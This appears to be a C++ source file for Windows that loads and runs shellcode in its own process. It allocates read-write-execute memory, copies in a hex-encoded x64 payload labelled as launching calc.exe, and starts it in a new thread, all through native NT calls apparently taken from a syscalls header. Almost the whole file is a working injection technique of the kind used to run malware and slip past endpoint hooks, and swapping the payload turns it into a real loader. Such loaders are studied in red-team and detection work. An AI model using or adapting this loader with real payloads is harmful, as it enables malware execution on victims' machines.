#include <iostream>
#include <windows.h>
#include <cstdlib>
#include <memory>
#include <ntstatus.h>

#include "../includes/syscalls.hpp"

#pragma comment(lib, "ntdll.lib")

void debug_info() {
  using std::wcout, std::endl, std::unique_ptr;

  constexpr LPCVOID no_source = nullptr;

  const DWORD error_code = GetLastError();

  constexpr DWORD default_language = 0;

  const unique_ptr<LPTSTR, decltype(&LocalFree)> error_msg_buffer{
      static_cast<LPTSTR *>(LocalAlloc(LPTR, sizeof(TCHAR))), &LocalFree};

  constexpr DWORD min_error_msg_buffer_size = 0;

  constexpr va_list *no_arguments = nullptr;

  FormatMessage(
      FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
      no_source,
      error_code,
      default_language,
      static_cast<LPTSTR>(
          static_cast<void *>(error_msg_buffer.get())),  //  it expect LPTSTR* casted to LPTSTR
      min_error_msg_buffer_size,
      no_arguments);

  if (!error_msg_buffer) {
    wcout << "Format message failed error code: " << error_code << endl;
    exit(EXIT_FAILURE);
  }

  wcout << "Error code " << error_code;
  wcout << " and error message: " << *error_msg_buffer << endl;
}

int main() {
  //  calc.exe shellcode
  unsigned char code[] =
      "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48"
      "\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
      "\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2"
      "\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
      "\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b"
      "\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
      "\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb"
      "\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
      "\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48"
      "\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
      "\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a"
      "\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
      "\x48\x83\xec\x20\x41\xff\xd6\x59\x59\x59\x59\x59\x59\x59\xc3";

  LPVOID allocation_start = nullptr;
  SIZE_T allocation_size = sizeof(code);
  HANDLE h_thread;
  NTSTATUS status;

  //  Allocate Virtual Memory
  status = NtAllocateVirtualMemory(GetCurrentProcess(),
                                   &allocation_start,
                                   0,
                                   (PSIZE_T)&allocation_size,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);
  if (status != STATUS_SUCCESS) {
    debug_info();
    exit(EXIT_FAILURE);
  }

  //  Copy shellcode into allocated memory
  status = NtWriteVirtualMemory(GetCurrentProcess(), allocation_start, code, sizeof(code), 0);
  if (status != STATUS_SUCCESS) {
    debug_info();
    exit(EXIT_FAILURE);
  }

  //  Execute shellcode in memory
  status = NtCreateThreadEx(&h_thread,
                            GENERIC_EXECUTE,
                            NULL,
                            GetCurrentProcess(),
                            allocation_start,
                            NULL,
                            FALSE,
                            NULL,
                            NULL,
                            NULL,
                            NULL);
  if (status != STATUS_SUCCESS) {
    debug_info();
    exit(EXIT_FAILURE);
  }

  //  Wait for the end of the thread and close the handle
  status = NtWaitForSingleObject(h_thread, FALSE, NULL);
  if (status != STATUS_SUCCESS) {
    debug_info();
    exit(EXIT_FAILURE);
  }

  status = NtClose(h_thread);
  if (status != STATUS_SUCCESS) {
    debug_info();
    exit(EXIT_FAILURE);
  }

  return EXIT_SUCCESS;
}